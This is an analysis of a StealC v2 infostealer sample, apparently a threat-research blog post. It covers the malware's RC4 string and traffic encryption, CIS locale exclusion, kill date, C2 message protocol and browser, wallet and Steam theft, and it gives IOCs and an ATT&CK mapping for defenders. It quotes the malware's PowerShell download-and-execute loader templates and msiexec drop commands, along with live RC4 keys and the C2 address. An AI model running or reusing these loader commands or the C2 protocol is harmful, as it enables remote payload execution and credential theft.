---
title: "StealC v2: Static and Dynamic Analysis of a Commodity Infostealer"
date: 2026-09-28
author: 0xMastEB
tags: [malware analysis, threat research, reverse engineering, infostealer, stealc, ioc, mitre attack, c2 analysis, static analysis, dynamic analysis]
sample_sha256: 7cd80c56e206d083eb68a411bb4b87409c466de055ebe64aa564f78e1cccfeae
---

# StealC v2: Static and Dynamic Analysis of a Commodity Infostealer

## Executive Summary

I grabbed this malware on purpose. I downloaded it deliberately to reverse engineer it and see what it actually does. It's an infostealer, so its whole job is to steal data. Through reverse engineering I confirmed it goes after browsers and apps like Chrome, Mozilla/Firefox and Steam: saved credentials, cookies (web sessions), autofill and wallet data. The full target list is in the analysis below.

A few things jumped out at me. Buried in the code there's a language check on the CIS region. If the machine's language is Russian or another CIS locale (Ukrainian, Belarusian, Kazakh, Uzbek) the malware just doesn't run. It's clearly written by someone in that region who doesn't want trouble at home but is happy to infect the rest of the world. There's also an auto kill, a kill date. Past a hardcoded date the function that launches the stealer never gets called, and I spotted this statically in IDA.

On the network side the sample registers with a hardcoded C2 server and ships everything it collects. I pushed the dynamic analysis hard. I emulated the C2 back end, replying with valid but theft disabled responses, so I could watch the full protocol and confirm the behaviour end to end in a contained lab, without ever performing real credential theft. What came out of it is a complete picture of the obfuscation, the C2 protocol, and the indicators (IOCs) and MITRE ATT&CK techniques defenders can use to detect it.

> StealC is a Malware as a Service infostealer sold since early 2023. StealC v2 (March 2025) is an x64 rewrite with a JSON over HTTP C2 and RC4 protected strings and traffic. Its infrastructure was disrupted on 24 June 2026 as part of Operation Endgame.

## Sample Metadata

| Field | Value |
|---|---|
| Family | StealC v2 (MaaS infostealer) |
| Build ID | `JSDIFBD` |
| SHA256 | `7cd80c56e206d083eb68a411bb4b87409c466de055ebe64aa564f78e1cccfeae` |
| SHA1 | `ef819f1dcd86d433e7a30e0564e45797811a2f60` |
| MD5 | `ae875c42d9f38cc2caa4628141c4763c` |
| File type | PE32+ (x64), GUI subsystem |
| Size | ~735 KB |
| Compiler | Microsoft Visual C++ (MSVC 19.50 / Visual Studio 2026) |
| Compile timestamp | 2026-02-02 14:27:47 UTC (about 1 day before first seen) |
| Packer | None (section entropy about 6.19, no high entropy regions) |
| Build-time source path (attribution) | `C:\builder_v2\stealc\json.h` |

Triage note. Detect It Easy reported a clean MSVC x64 binary with no known packer, and the entropy view showed no section above about 6.5, so the payload is not packed and we are looking at the StealC payload directly, not a crypter stub. The import table contains only KERNEL32.dll, which is the first hint that the rest of the API surface is resolved at runtime.

![Detect It Easy entropy view, no packed sections](/assets/img/stealc/01-die-entropy.png)
*Figure 1. DIE entropy: overall 6.19, no section above about 6.5. The payload is not packed.*

## Technical Analysis

### 1. String Obfuscation (base64 then RC4)

Only KERNEL32 is imported statically. Everything else (WinINet/WinHTTP, crypto, registry, GDI+ and so on) is resolved at runtime. The strings that drive this, the DLL names, API names and the C2 URL, are stored obfuscated and decoded on demand.

The decode routine runs base64 decode followed by RC4 decryption with a hardcoded key:

```
string RC4 key:  67OuaWeIA2
```

Example: the blob `OEQOAFq33QPi8qXk` goes through base64 decode, then RC4 with key `67OuaWeIA2`, and comes out as `kernel32.dll`.

Two initializer functions populate the string table (16 plus 260 references to the decrypt routine). Decrypting all references statically recovered 276 strings, including the full API surface, browser and wallet artefact names, the C2 endpoint, and the loader command templates.

I recognised the RC4 in the decompiler from the 256 byte state array, the key schedule loop, and the `data[i] ^ S[(S[i]+S[j]) & 0xFF]` keystream XOR.

![Both hardcoded RC4 keys loaded in init_strings](/assets/img/stealc/02-ida-string-keys.png)
*Figure 2. `init_strings` in IDA: both hardcoded RC4 keys loaded back to back, the network key `bfac87d80883578f` and the string key `67OuaWeIA2`, followed by a call to `decrypt_string`.*

![Decrypted strings via decrypt_string xrefs, including the C2](/assets/img/stealc/03-ida-decrypted-strings.png)
*Figure 3. Cross references to `decrypt_string`, each annotated with its decrypted value: resolved API names and, mid list, the C2 endpoint `185.100.157.18` and the path `/19fa6cbdd2bb41df.php`.*

### 2. Dynamic API Resolution

A central resolver walks the (now decrypted) DLL and API name strings and calls `LoadLibraryA` then `GetProcAddress`, storing the function pointers in a global table. This keeps the static import table down to KERNEL32 only and defeats triage that leans on strings or imports.

### 3. Execution Flow (WinMain)

1. Decrypt the base strings (KERNEL32/ADVAPI32 plus the resolver's own API names).
2. Resolve APIs via `LoadLibraryA` and `GetProcAddress`.
3. CIS language guard. `GetUserDefaultLangID` is called, and if the language ID is one of:

   | LangID | Locale |
   |---|---|
   | 1049 | Russian (ru_RU) |
   | 1058 | Ukrainian (uk_UA) |
   | 1059 | Belarusian (be_BY) |
   | 1087 | Kazakh (kk_KZ) |
   | 1091 | Uzbek (uz_Latn_UZ) |

   then the process calls `ExitProcess(0)` and does nothing. This is the usual CIS exclusion seen in Russian market commodity malware.
4. Single instance guard via `OpenEventW` and `CreateEventW` on a named event built from host identifiers (observed pattern: `..._DESKTOP-<name>_<user>...`).
5. Build kill date. A hardcoded date string (`05/03/2026`, MM/DD vs DD/MM not confirmed) is compared against the current system time. If the date has passed, the stealer stage does not run. This is why, on a machine with a current date, the jump over the stealer has to be bypassed to observe behaviour.
6. `stealer_main`: C2 registration, then collection, then exfiltration, then loader.

![WinMain: CIS language check and single instance guard](/assets/img/stealc/04-ida-winmain-cis-check.png)
*Figure 4. WinMain in IDA: the five CIS language IDs that trigger ExitProcess, and right below it the single instance wait loop (OpenEventW + Sleep).*

### 4. C2 Protocol

Every C2 message is base64 of RC4 of the JSON, and it uses a separate network key:

```
network RC4 key:  bfac87d80883578f
C2:               hxxp://185.100.157.18/19fa6cbdd2bb41df.php   (HTTP POST, Content-Type: application/json)
```

Reconstructed message sequence, observed live against a controlled C2 responder in the lab:

| # | Bot to C2 (`type`) | Purpose |
|---|---|---|
| 1 | `create` | Registration. Body: `{"type":"create","hwid":"<GUID>","build":"JSDIFBD"}`. Receives the task config. |
| 2 | `upload_file` | Exfiltration. Body carries base64 `data` and `filename` (first upload is `system_info.txt`). |
| 3 | `done` | Signals end of collection. |
| 4 | `loader` | Requests the optional second stage payload. |

![FakeNet-NG capturing the C2 registration POST](/assets/img/stealc/05-fakenet-c2-post.png)
*Figure 5. FakeNet-NG capturing the registration beacon: HTTP POST to 185.100.157.18 `/19fa6cbdd2bb41df.php`, with the body carrying the base64(RC4(...)) payload.*

Config response. The C2 replies with base64 of RC4 of a config JSON. The parser is nlohmann/json, which is where the `C:\builder_v2\stealc\json.h` artifact comes from, and it requires `opcode` to equal `success`. A value of `blocked` triggers `ExitProcess`. Config fields observed:

```
opcode, access_token, self_delete, take_screenshot, loader,
steal_steam, steal_outlook, browsers[], plugins[], files[]
```

Host fingerprint (`system_info.txt`). The first exfiltrated artefact is a full host profile: HWID, OS build, architecture, username, computer name, local time and UTC offset, language and keyboard layouts, laptop flag, the malware's own running path, CPU, cores, threads, RAM, display resolution, GPU, running process list, and installed applications. In the lab it leaked the VirtualBox Graphics Adapter strings word for word, so the sample makes no attempt to detect or evade the VM.

### 5. Collection Capabilities (from decrypted strings and config)

* Chromium browsers: `Local State` (`os_crypt` / `encrypted_key`), `Login Data`, `Cookies`, `Web Data`, autofill, history, with AES key unwrap via `CryptUnprotectData` (DPAPI).
* Firefox and Gecko: `nss3.dll` (`NSS_Init`, `PK11SDR_Decrypt`) against `logins.json`, `cookies.sqlite`, `places.sqlite`, `formhistory.sqlite`.
* Crypto wallets, and browser extension stores (`Local Extension Settings`, IndexedDB).
* Steam: `Software\Valve\Steam`, `ssfn*`, `config.vdf`, `loginusers.vdf`, `libraryfolders.vdf`.
* Outlook.
* Screenshots: GDI+ and `BitBlt` capture to `screenshot.jpg`.

### 6. Loader / Second Stage

Driven by the `loader` config, executed through `ShellExecute` family calls:

* PowerShell download and run: builds `"iwr <url> |iex"` and executes it.
* PowerShell legacy: `iex(New-Object Net.WebClient).DownloadString('<url>')`.
* MSI: downloads to `%ProgramData%\<random>.msi` and runs `msiexec /i "<path>" /passive`, retrying up to 10 times.
* If the `run_as_admin` flag is set, the launch uses the `runas` verb (elevation / UAC prompt).

### 7. Anti Analysis Summary

| Technique | Present | Notes |
|---|---|---|
| String encryption (base64 then RC4) | Yes | key `67OuaWeIA2` |
| Dynamic API resolution | Yes | KERNEL32 only IAT |
| Encrypted C2 (RC4) | Yes | key `bfac87d80883578f` |
| CIS language guard | Yes | exits on RU/UA/BE/KK/UZ |
| Single instance event | Yes | host derived event name |
| Build kill date | Yes | `05/03/2026` (format not confirmed) |
| Self deletion | Partial | config flag `self_delete` exists, but the mechanism was not verified in this analysis |
| Anti VM / anti sandbox | No | none observed, it ran and exfiltrated inside VirtualBox |

## Indicators of Compromise (IOCs)

Hashes
```
SHA256  7cd80c56e206d083eb68a411bb4b87409c466de055ebe64aa564f78e1cccfeae
SHA1    ef819f1dcd86d433e7a30e0564e45797811a2f60
MD5     ae875c42d9f38cc2caa4628141c4763c
```

Network
```
C2 IP    185.100.157.18
C2 URL   hxxp://185.100.157.18/19fa6cbdd2bb41df.php
Method   HTTP POST, Content-Type: application/json
```

Cryptographic and config
```
String RC4 key    67OuaWeIA2
Network RC4 key   bfac87d80883578f
Build ID          JSDIFBD
Build source path C:\builder_v2\stealc\json.h
```

Host artefacts
```
%ProgramData%\<random>.msi     (MSI loader drop)
system_info.txt                (host fingerprint, exfiltrated)
screenshot.jpg                 (screen capture)
Named event: ..._DESKTOP-<name>_<user>...  (single instance guard)
```

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Defense Evasion | Dynamic API Resolution | T1027.007 |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 |
| Discovery | System Location Discovery: System Language | T1614.001 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Process Discovery | T1057 |
| Discovery | System Owner/User Discovery | T1033 |
| Discovery | Software Discovery | T1518 |
| Discovery | System Network Configuration Discovery | T1016 |
| Credential Access | Credentials from Web Browsers | T1555.003 |
| Credential Access | Steal Web Session Cookie | T1539 |
| Credential Access | Credentials In Files | T1552.001 |
| Collection | Screen Capture | T1113 |
| Collection | Data from Local System | T1005 |
| Command and Control | Application Layer Protocol: Web | T1071.001 |
| Command and Control | Encrypted Channel: Symmetric Cryptography | T1573.001 |
| Command and Control | Data Encoding: Standard Encoding | T1132.001 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Execution | System Binary Proxy Execution: Msiexec | T1218.007 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Defense Evasion | Indicator Removal: File Deletion (self delete) | T1070.004 (flag present, not verified) |

## Analysis Environment and Methodology

Static analysis was done in IDA Pro (x64), with string decrypt recovery via IDAPython and mapping of the dynamic API resolver. Dynamic analysis ran in an isolated Windows VM (VirtualBox, host only networking), with x64dbg for the kill date bypass and FakeNet-NG for network containment.

A note on the IDA figures. The binary ships with no symbols, so out of the box every function is a bare `sub_XXXXXXX` and the interesting strings are encrypted blobs. The readable names in the screenshots (`decrypt_string`, `init_strings`, `rc4`, `exit_process` and so on) and the `dec:` comments next to each `decrypt_string` call are my own annotations, applied during analysis: I renamed the functions as I understood them, and I ran an IDAPython script that decrypted every string and wrote the plaintext back as a comment. In other words, the figures show the binary after the work, not how it looked when it was first loaded.

For the C2 emulation I used a controlled HTTP responder that replies to the registration POST with a benign, theft disabled config (`opcode: success`, all collection flags `false`, empty target arrays). This confirmed the response encryption scheme and let the full message sequence be observed without performing any real credential collection.

Sample obtained from MalwareBazaar (signature Stealc, botnet jsdifbd).
